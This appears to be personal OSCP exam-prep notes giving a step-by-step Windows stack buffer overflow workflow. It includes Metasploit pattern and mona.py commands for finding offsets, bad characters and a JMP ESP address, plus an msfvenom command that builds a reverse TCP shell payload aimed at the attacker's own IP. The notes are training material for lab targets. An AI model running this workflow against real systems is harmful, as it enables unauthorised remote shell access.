1. Fuzz and get crash length
2. Use metasploit-framework's create_pattern.rb to get pattern payload
	1. msf-pattern_create -l [crash + 400]
	2. /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [crash + 400]
4. With the value in the EIP get the exact offset using metasploit-framework's pattern_offset.rb
	1. msf-pattern_offset -q [EIP] -l [crash + 400]
	2. /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [EIP] -l [crash + 400]
or
		1. !mona findmsp -distance [crash + 400]
1. Identify bad characters by sending payload to the stack filled with all possible characters and seeing which have altered values: !mona bytearray -b "\x00"
2. Get the return adress of jump function that doesn't contain any of the bad chars:
	1. !mona modules
	2. !mona find -s "\xff\xe4" -m [module] -cpb [bad chars] or  !mona jmp -r esp -cpb "\x00"
3. create payload with msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=[OWN IP] LPORT=[PORT to listen on] EXITFUNC=thread -b [bad chars to exclude from payload] -f c
4. Get shell

## Tips
- THM buffer overflow OSCP prep
- Practice using mona.py
- Download vulnerable exe from exploit db
- [GitHub - justinsteven/dostackbufferoverflowgood](https://github.com/justinsteven/dostackbufferoverflowgood)
- [PWK/OSCP – Stack Buffer Overflow Practice – vortex's blog](https://www.vortex.id.au/2017/05/pwkoscp-stack-buffer-overflow-practice/)
- Easy 25 points
- [PWK-OSCP-Preparation-Roadmap/BOF at master · security-prince/PWK-OSCP-Preparation-Roadmap · GitHub](https://github.com/security-prince/PWK-OSCP-Preparation-Roadmap/blob/master/BOF)